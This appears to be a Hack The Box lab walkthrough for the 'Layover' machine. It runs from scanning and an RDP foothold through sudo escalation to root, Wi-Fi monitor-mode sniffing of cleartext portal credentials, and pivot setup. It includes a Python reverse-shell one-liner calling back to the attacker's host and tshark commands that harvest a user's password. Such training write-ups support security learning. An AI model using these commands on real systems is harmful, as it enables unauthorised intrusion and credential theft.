---
link: https://app.hackthebox.com/machines/Layover
difficulty: Medium
os: Linux
pov: red
release date: 2026-09-26
tags:
  - SN_12
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png
solved:
solve date:
machine no.: 1
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Layover Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/31190">TRX</a></p>
    <p style="margin: 0;">Difficulty: Medium</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Confirm target reachability

Before scanning, verify the host answers over the VPN and read the TTL for a first, free OS guess. A dead host wastes a long full-port scan; a live one with a tell-tale TTL saves you a question later.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ping`|Sends ICMP echo-request packets and waits for echo-replies to prove L3 reachability.|
|`-c 4`|Stop after 4 packets instead of running forever, so the command returns on its own.|
|`$IP`|Session variable holding the target address, resolved to TARGET_IP.|

**Result:**

```
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=220 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=269 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=215 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=217 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 215.351/230.282/269.199/22.518 ms
```

Key findings:

- Host is up: 4/4 replies, 0% packet loss (evidence).
- `ttl=63` implies an original TTL of 64 decremented by one hop, which is the Linux default, so the target is likely Linux (inference, to be confirmed by the service banners).
- Average RTT ~230 ms is pure VPN latency, so expect sluggish interactive sessions and plan to drop to a reverse shell early (inference).

**Next:** With the host confirmed alive, enumerate every open TCP port to map the full attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:**

```bash
# fast all-ports sweep, piped through the grapo helper to extract open ports
nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmap -p-`|Scan all 65,535 TCP ports, not just nmap's top 1,000 default, so no odd service is missed.|
|`--min-rate 5000`|Send at least 5,000 packets/sec; counters the ~230 ms VPN latency that would otherwise make a full sweep crawl.|
|`-Pn`|Skip host-discovery ping and treat the host as up; reachability was already proven in 1.1.|
|`\| grapo`|Custom zsh helper: tees nmap output to the terminal and emits the open ports as a comma-separated list for reuse in the next scan.|

**Result:**

```
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 39.75 seconds

22,3389
```

**What this gives you:**

Key findings:

- Only two TCP ports are open across the full range: 22 (ssh) and 3389 (ms-wbt-server).
- `grapo` emits `22,3389` as a ready-to-paste port list for the targeted scan.
- A very small external surface with no web port is an early sign the real targets sit on an internal segment (pivoting).

**Next:** Run a version and default-script scan against only the two open ports to fingerprint the services and lock down the OS.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 Fingerprint services and OS on open ports

**Command:**

```bash
nmap -A -p 22,3389 TARGET_IP
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmap -A`|Aggressive scan: enables `-sV` version detection, `-sC` default scripts, OS detection, and traceroute in one flag.|
|`-p 22,3389`|Restrict the heavy scan to the two confirmed-open ports from 1.2, keeping it fast.|

**Result:**

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|22/tcp|ssh|OpenSSH 9.6p1 Ubuntu 3ubuntu13.19|Ubuntu banner confirms Linux; SSH is restricted on this box, so not the intended entry despite having creds.|The normal remote-login door. It's locked to us here, so we don't use it to get in.|
|3389/tcp|ms-wbt-server|Microsoft Terminal Service (xrdp)|RDP on Linux = xrdp; PAM-backed graphical desktop. Supplied creds `contractor / Contractor2026!` target this.|A "remote screen" door. On Linux this is xrdp, giving a full graphical desktop instead of a text shell. This is our way in.|

**What this gives you:**

Key findings:

- Target OS is Ubuntu Linux, confirmed by the OpenSSH banner. The conflicting "MikroTik RouterOS" OS-detection guess is flagged unreliable by nmap's own warning (no open+closed port pair for the fingerprint) and is discarded.
- RDP on a Linux host indicates xrdp; because xrdp authenticates against local PAM, the handed-out RDP credentials are also local user credentials.
- Absence of any external web service (no 80/443) confirms the target web application lives on an unreachable internal segment, consistent with a pivoting engagement.

**Next:** Use the supplied `contractor / Contractor2026!` credentials against xrdp on 3389 to land a graphical foothold on the workstation; SSH is restricted, so RDP is the intended entry.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Initial Access: Foothold via RDP (xrdp)

### Connect to the Linux desktop as contractor:

**Why this step:** Recon showed xrdp on 3389 and supplied `contractor / Contractor2026!`, with SSH not accepting this account. RDP is the intended door, so use it to land a graphical session on the workstation.

**Command:**

bash

```bash
xfreerdp3 /v:TARGET_IP /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution /sec:tls
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`xfreerdp3`|FreeRDP 3 command-line RDP client. Every option is a single unbroken `/flag:value` token; a space after the colon splits the argument and aborts with "Unsupported command line syntax."|
|`/v:TARGET_IP`|The victim host to connect to.|
|`/u:contractor`|Username supplied by HTB.|
|`/p:'Contractor2026!'`|Password, single-quoted so Bash treats `!` literally instead of triggering history expansion. No space between `/p:` and the value.|
|`/cert:ignore`|xrdp presents a self-signed certificate Kali does not trust; connect anyway rather than aborting on validation.|
|`/dynamic-resolution`|Allow the RDP window to resize dynamically, keeping the laggy desktop workable.|
|`/sec:tls`|Force TLS security negotiation, which modern xrdp expects.|

**Result:** Session established. Title bar shows `FreeRDP: TARGET_IP`; desktop is XFCE logged in as `contractor`. Log output confirms a successful connect (framebuffer init, dynamic virtual channels `ainput` / `rdpgfx` / `disp` / `rdpsnd` loaded); the `/p is insecure`, `/cert:ignore` DANGER, and `BB_ERROR_BLOB` license warnings are benign and expected against xrdp.

![[layover_rdp_desktop.png]]

**What this gives you:**

Key findings:

- Graphical foothold as the `contractor` user on the workstation (host `airside-ws01`, to be confirmed at a terminal prompt).
- The desktop is Linux XFCE served by xrdp, giving GUI access (useful later for the Wi-Fi network applet) but not a fast shell.

**Next:** Open a terminal in the Xfce session and check `sudo -l` to assess local privilege on the workstation before doing any heavier work.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Privilege Escalation (Workstation): sudo misconfiguration → root

### 3.1 Enumerate sudo rights for contractor:

**Why this step:** With a shell as `contractor` on airside-ws01 (2.1), the fastest local-privilege check is the sudo policy. A permissive entry is the most common instant-win on Linux.

**Command:**

```bash
sudo -l
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo -l`|List the sudo privileges granted to the current user, as defined in `/etc/sudoers`, without running anything. Prompts for the user's own password on first use.|

**Result:**

```
Matching Defaults entries for contractor on airside-ws01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User contractor may run the following commands on airside-ws01:
    (ALL : ALL) ALL
```

**What this gives you:**

Key findings:

- `contractor` may run `(ALL : ALL) ALL`: any command, as any user, as any group, on this host. This is full administrative control.
- Escalation requires only contractor's own password (already known), with no restriction on the command.

###### Reading the sudoers grant:

The entry `(ALL : ALL) ALL` has three fields. The first `ALL` is the set of users the command may be run as (any user, root included). The `ALL` inside the parentheses is the set of groups it may be run as. The final `ALL` is the set of permitted commands. All three being `ALL` means the user can execute any command as anyone, which is equivalent to unrestricted root.

**Next:** Invoke a root shell with `sudo su` to take full control of the workstation, then use that access to enumerate network interfaces for the pivot.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Escalate to root on the workstation:

**Why this step:** `sudo -l` (3.1) returned `(ALL : ALL) ALL`, so a root shell is one command away. Take it to unlock root-only resources, principally the network interfaces needed for the pivot.

**Command:**

```bash
sudo su
whoami ; id
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo su`|Run `su` (switch user, defaulting to root) under sudo. Because the sudoers entry permits any command as any user, this drops straight into a root shell. Reuses the cached sudo timestamp, so no re-prompt.|
|`whoami ; id`|Confirm the new identity: `whoami` prints the username, `id` prints the full uid/gid/groups so there is no doubt about the privilege level.|

**Result:**

```
root@airside-ws01:/home/contractor# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
```

**What this gives you:**

Key findings:

- Full root (`uid=0`) on airside-ws01, confirmed by `id`.
- No user or root flag resides on this host; its value is as a pivot. Root is required for the next phase (bringing up and reconfiguring the hidden wireless interfaces).

**Next:** Enumerate all network interfaces as root to find the pivot path inward; the external interface only reaches HTB, so look for additional (likely wireless) segments.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Internal Network Discovery

### 4.1 Enumerate network interfaces on the pivot:

**Why this step:** Root on airside-ws01 (3.2) is only useful for what it reaches. The external interface sees HTB but not the internal targets, so enumerate every interface to find the inward path.

**Command:**

```bash
ip -br a
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip -br a`|`ip address` in brief mode: one line per interface showing name, operational state, and assigned addresses. Fast way to spot non-standard interfaces.|

**Result:**

```
lo               UNKNOWN        127.0.0.1/8 ::1/128
wlan2            DOWN
wlan3            DOWN
eth0@if11        UP             TARGET_IP/24 metric 100 fd42:3ff5:6554:20e5:216:3eff:fe83:ea41/64 fe80::216:3eff:fe83:ea41/64
```

**What this gives you:**

Key findings:

- `eth0@if11` is the external (HTB-facing) interface holding the workstation's 10.x.x.x/24 address; the `@if11` suffix marks it as one end of a veth pair (container networking). Per the engagement notes, this interface must not be used as the pivot route.
- `wlan2` and `wlan3` are two wireless interfaces, both `DOWN`. Wireless radios on a workstation indicate simulated Wi-Fi via the kernel `mac80211_hwsim` module.
- The two radios serve distinct roles in the plan: `wlan2` as the client interface to associate with the internal Wi-Fi (obtaining an address on the hidden internal subnet), and `wlan3` as a monitor-mode interface to sniff traffic on that network.

###### What mac80211_hwsim is (beginner theory):

A normal Wi-Fi interface is backed by a physical radio (a PCIe or USB card). In a virtualized HTB box there is no physical hardware, so the Linux kernel loads `mac80211_hwsim`, a module that creates fully software-simulated wireless radios. To every userland tool (`iw`, `nmcli`, `wpa_supplicant`, `tshark`) these behave exactly like real adapters: they can scan for access points, associate with an SSID, pull a DHCP lease, and be flipped into monitor mode. The box uses this to build an internal wireless network segment that is only reachable from this workstation, which is precisely what forces the pivot.

**Next:** Bring up `wlan2` and scan for the internal access point to learn its SSID, channel, and security, then associate to obtain an address on the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Escape the RDP session to a stable reverse shell on Kali:

**Why this step:** The xrdp desktop is laggy and self-terminates, which would kill any in-progress work. A reverse shell is a plain TCP socket independent of the GUI, so it survives the desktop dropping and gives a fast terminal for the wireless and tunneling work ahead. For this hop the callback goes to Kali's `tun0`, because the workstation's external interface can reach the VPN.

**Command:**

```bash
# On Kali: start the listener FIRST (order matters; a late listener yields "Connection refused")
nc -lvnp 4444

# On airside-ws01 (root RDP terminal): fire the reverse shell to Kali tun0
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_TUN0_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nc -lvnp 4444`|Listener on Kali: `-l` listen, `-v` verbose (prints the connect line), `-n` no DNS, `-p 4444` port. Must be running before the client connects or the target gets `Connection refused`.|
|`python3 -c '...'`|One-liner reverse shell; Python is present on the target and reliable for this.|
|`socket.socket();s.connect(("KALI_TUN0_IP",4444))`|Open a TCP connection back to the Kali listener.|
|`os.dup2(s.fileno(),0/1/2)`|Duplicate the socket onto file descriptors 0, 1, 2 (stdin/stdout/stderr), rewiring the process's standard streams onto the network.|
|`subprocess.call(["/bin/bash","-i"])`|Spawn an interactive bash; with the streams already redirected, its I/O flows over the socket to Kali.|

**Result:**

```
listening on [any] 4444 ...
connect to [KALI_TUN0_IP] from (UNKNOWN) [TARGET_IP] 59582
root@airside-ws01:/home/contractor#
```

**Next:** Upgrade the dumb shell to a full PTY so `sudo`/`su`, job control, and line editing behave, then begin wireless enumeration on `wlan2`.
<div align="center">
<br>
<br>
</div>

###### Stabilize the shell to a full PTY

**Why this step:** The caught shell is a raw pipe with no controlling terminal, so `su`, `sudo`, and job control misbehave and an accidental Ctrl-C kills the session. Promote it to a real pseudo-terminal before doing interactive work.

**Command:**

```bash
# In the caught shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
# then press Ctrl-Z to background it

# On Kali:
stty raw -echo; fg
# press Enter twice
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Allocate a pseudo-terminal and run bash inside it, giving the shell a real controlling TTY.|
|`export TERM=xterm-256color`|Tell programs what terminal type they are on, so screen-drawing tools (editors, pagers) render correctly.|
|`Ctrl-Z`|Suspend the local `nc`, returning control to Kali so terminal settings can be changed.|
|`stty raw -echo`|Put the local terminal in raw mode and disable local echo, so keystrokes pass straight to the remote PTY without double-printing.|
|`fg`|Resume `nc` in the foreground, reconnecting to the now-raw terminal.|

**Result:**

```
root@airside-ws01:/home/contractor#   (fully interactive: job control, su/sudo, and line editing now work)
```

**Next:** Bring `wlan2` up and scan for the internal access point to learn its SSID, channel, and security posture.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Scan for the internal access point on wlan2

**Why this step:** `wlan2` is a client radio (4.1) but was down and silent. Bring it up and scan to learn the internal network's name, channel, and security before attempting to join, and to record the channel needed for monitor-mode sniffing later.

**Command:**

```bash
ip link set wlan2 up
iw dev wlan2 scan | grep -iE 'SSID|signal|DS Parameter|channel'
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip link set wlan2 up`|Enable the interface so its radio can transmit probe requests and receive beacons. A down radio hears nothing.|
|`iw dev wlan2 scan`|Perform an active 802.11 scan on wlan2, dumping every access point's beacon/probe-response details.|
|`grep -iE 'SSID\|signal\|DS Parameter\|channel'`|Filter the verbose scan to the fields that matter: network name, signal strength, and operating channel.|

**Result:**

```
        signal: -30.00 dBm
        SSID: HTB International WiFi
        DS Parameter set: channel 6
                 * Extended Channel Switching
                 * Multiple BSSID
                 * SSID List
```

**What this gives you:**

Key findings:

- Internal access point identified: SSID `HTB International WiFi`, operating on **channel 6**, signal `-30 dBm` (strong).
- No RSN/WPA information element present, so the network is **open** (no encryption). This permits association without a key and, crucially, means traffic traverses the air in cleartext and can be sniffed.
- Channel 6 is the value to tune the monitor interface (wlan3) to later; a monitor interface only receives on the single channel it is set to.

**Observation:** `wlan2` reads `DOWN` again in `ip -br a` immediately after a successful scan, indicating a service (NetworkManager or wpa_supplicant) is reclaiming the radio. Manual wireless management is therefore preferred for stable association and for monitor mode.

**Next:** Associate `wlan2` with the open AP and obtain a DHCP lease to gain an address on the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Associate with the internal Wi-Fi and obtain a lease

**Why this step:** The AP is confirmed open on channel 6 (4.3). Associating `wlan2` and pulling a DHCP lease places the workstation on the internal subnet, the prerequisite for reaching the internal portal and for tunneling that network back to Kali.

**Command:**

```bash
nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip -br a
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmcli device wifi connect "HTB International WiFi"`|Instruct NetworkManager to associate with the named open SSID. For an unencrypted network no key argument is needed.|
|`ifname wlan2`|Bind the connection to the client radio (not wlan3, which is reserved for monitor-mode sniffing).|
|`ip -br a`|Verify the interface came up and received an address on the internal subnet.|

**Result:**

```
wlan2            UP             10.13.37.182/24 fe80::e8f1:faed:ebef:e243/64
```

**What this gives you:**

Key findings:

- `wlan2` is associated and holds `10.13.37.182/24`, placing the workstation on the internal network `10.13.37.0/24`.
- The workstation is now dual-homed: `eth0` on the HTB-facing net and `wlan2` on the internal net. All subsequent internal access (ligolo route advertisement, internal reverse-shell callbacks) uses the `wlan2` address `10.13.37.182`.
- The internal portal `portal.international.htb` is expected on this subnet (to be confirmed).

**Next:** Put the second radio `wlan3` into monitor mode on channel 6 and sniff the open network for cleartext credentials, since `contractor` creds do not work on the internal portal and another user's login must be captured.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.5 Confirm the internal portal and read the captive-portal notice

**Why this step:** With an address on `10.13.37.0/24` (4.4), verify the leaked target is reachable from the pivot and capture any information the captive portal exposes before committing to the sniffing attack.

**Command:**

```bash
ping -c 2 10.13.37.10
curl -s -I http://10.13.37.10/
curl -s http://wifi.international.htb/ 2>/dev/null | grep -iE 'portal|miles|international'
```

**Breakdown:**

| Component                                            | Reasoning                                                                                                             |
| ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `ping -c 2 10.13.37.10`                              | Confirm the portal host is up on the internal segment and read its TTL to gauge network distance.                     |
| `curl -s -I http://10.13.37.10/`                     | Fetch only HTTP response headers (`-I`) silently (`-s`) to fingerprint the web server without pulling the whole page. |
| `curl -s http://wifi.international.htb/ \| grep ...` | Retrieve the captive-portal page and filter for the leaked internal hostnames and paths.                              |

**Result:**

```
64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=0.311 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=0.254 ms

Server: nginx/1.24.0 (Ubuntu)
HTTP/1.1 200 OK
Content-Type: text/html

<title>HTB International WiFi</title>
  <a class="btn" href="http://portal.international.htb/">Accept &amp; continue to airport portal</a>
    <b>HTB Airways staff notice:</b> the <b>HTB Airways Miles</b> employee portal is
    <code>http://portal.international.htb/miles/</code>. Please sign in periodically to
    verify your Miles balance and lounge bookings.
```

Result (captive portal in RDP desktop browser):

![[layover_captive_portal.png]]

**What this gives you:**

Key findings:

- `10.13.37.10` is up with `ttl=64` and sub-millisecond RTT, indicating the portal is on the same L2 segment as `wlan2` (zero hops), directly reachable.
- Web server is `nginx/1.24.0 (Ubuntu)`, serving over plain HTTP (no TLS).
- The captive portal leaks the internal targets: `http://portal.international.htb/` (mapped to `10.13.37.10`) and the employee area `http://portal.international.htb/miles/`.
- The staff notice instructs employees to sign in periodically, which is what generates the authentication traffic the sniffing attack will capture.

**Next:** Because the network is open and the portal uses plain HTTP, put `wlan3` into monitor mode on channel 6 and passively capture HTTP POST logins to harvest a valid user's credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. Credential Interception (Wireless Sniffing)

### 5.1 Put wlan3 into monitor mode on the AP's channel:

**Why this step:** The internal portal needs credentials that `contractor` does not have (4.5). The network is open and uses plain HTTP, so another user's login can be captured off the air. Monitor mode on the second radio lets wlan3 passively receive all 802.11 frames on the AP's channel without associating.

**Command:**

```bash
systemctl stop NetworkManager
killall wpa_supplicant 2>/dev/null
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
iw dev wlan3 info
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`systemctl stop NetworkManager`|Stop the service that would otherwise reclaim the radio and reset its mode/channel mid-capture.|
|`killall wpa_supplicant`|Kill any supplicant still holding a radio, for the same reason.|
|`ip link set wlan3 down`|An interface's type cannot be changed while it is up.|
|`iw dev wlan3 set type monitor`|Switch the radio from managed to monitor mode so it delivers every frame it hears, regardless of destination MAC.|
|`ip link set wlan3 up`|Bring the interface back up in the new mode.|
|`iw dev wlan3 set channel 6`|Tune the radio to the AP's channel (from 4.3); monitor mode only receives on the single channel it is set to.|
|`iw dev wlan3 info`|Verify the configuration: expect `type monitor` and `channel 6`.|

**Result:**

```
Interface wlan3
        ifindex 7
        addr 02:00:00:00:03:00
        type monitor
        wiphy 3
        channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
        txpower 20.00 dBm
```

**What this gives you:**

Key findings:

- `wlan3` is confirmed in `type monitor` on `channel 6`, ready to passively capture all traffic on the AP's frequency.
- With NetworkManager stopped, no service will reset the interface during capture.

###### Managed vs monitor mode (beginner theory):

A wireless interface normally runs in managed (infrastructure) mode, where the card's firmware filters out every frame not addressed to its own MAC address, plus broadcasts, to save CPU. That means a managed interface cannot see other clients' traffic. Monitor mode (RFMON) disables that filtering: the radio hands the operating system every 802.11 frame it receives on its current channel, no matter who it is addressed to. Two constraints follow. First, no other process may manage the radio, or it will keep knocking it out of monitor mode. Second, the radio only hears the one channel it is tuned to, so the capture channel must match the target AP's channel exactly; a mismatch produces an empty capture even though everything else is set up correctly.

**Next:** Run tshark on `wlan3` filtered to HTTP POST requests and wait for a staff login, extracting the submitted username and password fields.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.2 Capture cleartext credentials with tshark

**Why this step:** With wlan3 in monitor mode on channel 6 (5.1) and the portal using plain HTTP over an open network, a staff login can be read directly off the air. Filter for HTTP POST form submissions and extract the credential fields.

**Command:**

```bash
tshark -i wlan3 -a duration:120 \
  -Y 'http.request.method=="POST"' \
  -T fields -e frame.time -e wlan.sa -e ip.src -e http.host \
            -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`tshark -i wlan3`|Capture on the monitor-mode interface, which receives all frames on channel 6.|
|`-a duration:120`|Auto-stop after 120 seconds so the command returns; re-run with a longer window if no login occurs in that time.|
|`-Y 'http.request.method=="POST"'`|Display filter limiting output to HTTP POST requests, i.e. form submissions such as logins.|
|`-T fields`|Output selected fields only, rather than the default packet summary.|
|`-e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri`|Print timestamp, sender MAC, source IP, target host, and request path for context.|
|`-e urlencoded-form.key -e urlencoded-form.value`|Print the decoded form field names and their values: the username and password.|

**Result:**

```
Oct  3, 2026 14:31:03 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
Oct  3, 2026 14:31:43 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
Oct  3, 2026 14:32:23 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
3 packets captured
```

**What this gives you:**

Key findings:

- Cleartext credentials captured: **`jenny` / `Fl1ghtDeck2026!`**, POSTed to `portal.international.htb/miles/login.php` from internal client `10.13.37.132`.
- The capture repeats on a ~40-second interval, confirming a scripted staff login and validating the channel/filter setup.
- These credentials belong to the internal portal (Craft CMS) and are reused to authenticate to the Craft control panel for the next phase.

###### Why the credentials were readable (theory):

Two missing protections stack here. The Wi-Fi is an open network, so frames are not encrypted at the link layer, and the portal serves over HTTP rather than HTTPS, so there is no TLS at the application layer either. With neither in place, the POST body travels as plaintext bytes that any monitor-mode radio tuned to the correct channel can read. Adding either WPA2 on the Wi-Fi or TLS on the site would have defeated this capture.

**Next:** Build a network tunnel from Kali through the pivot so Kali's browser and tooling can reach `portal.international.htb` directly, then log into the Craft CMS control panel as jenny.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Pivoting with ligolo-ng

### 6.1 Restore the internal Wi-Fi leg manually (post-NetworkManager)

**Why this step:** Stopping NetworkManager for monitor mode (5.1) dropped the wlan2 association, leaving it `DOWN`. The tunnel's agent forwards traffic out through wlan2, so the internal leg must be re-established first, this time with wpa_supplicant so it does not depend on the stopped NetworkManager.

**Command:**

```bash
pkill -9 -f "wpa_supplicant.*wlan2" 2>/dev/null; rm -rf /run/wpa_supplicant; mkdir -p /run/wpa_supplicant
ip link set wlan2 down; sleep 1; ip link set wlan2 up; sleep 2
cat > /tmp/wpa-open.conf <<'EOF'
ctrl_interface=/run/wpa_supplicant
update_config=1
network={
    ssid="HTB International WiFi"
    key_mgmt=NONE
    scan_ssid=1
}
EOF
wpa_supplicant -B -i wlan2 -c /tmp/wpa-open.conf -D nl80211 -f /tmp/wpa.log
sleep 6
iw dev wlan2 link
dhcpcd -t 15 wlan2 || dhclient wlan2
ip -br a show wlan2
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`pkill ...; rm -rf /run/wpa_supplicant; mkdir`|Clear any stale supplicant process and its control socket so a fresh instance can bind.|
|`ip link set wlan2 down; up`|Reset the interface cleanly before re-associating.|
|heredoc `/tmp/wpa-open.conf`|Minimal supplicant config. `key_mgmt=NONE` declares an open network (no PSK negotiation); `scan_ssid=1` actively probes for the SSID.|
|`wpa_supplicant -B -i wlan2 -c ... -D nl80211 -f ...`|Run the supplicant backgrounded on wlan2 with that config, using the nl80211 driver, logging to `/tmp/wpa.log`.|
|`iw dev wlan2 link`|Confirm association to the AP.|
|`dhcpcd -t 15 wlan2 \| dhclient wlan2`|Request a DHCP lease (dhcpcd, falling back to dhclient).|
|`ip -br a show wlan2`|Verify the interface holds an internal address.|

**Result:**

```
wlan2: connected to Access Point: HTB International WiFi
wlan2: offered 10.13.37.183 from 10.13.37.1
wlan2: leased 10.13.37.183 for 43200 seconds
wlan2: adding route to 10.13.37.0/24
wlan2            UP             10.13.37.183/24 fe80::ebc3:c708:b5e:e7a7/64
```

**What this gives you:**

Key findings:

- `wlan2` is re-associated via wpa_supplicant and holds `10.13.37.183/24` (the lease differs from the earlier `.182`; the current internal address is `10.13.37.183`).
- This address is the one later internal reverse-shell callbacks must target, because the internal portal cannot route to Kali.
- Monitor-mode `wlan3` is unaffected; the two radios are independent.

**Next:** Transfer the ligolo agent to the pivot, start the proxy on Kali, connect the agent, and autoroute the internal `/24`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
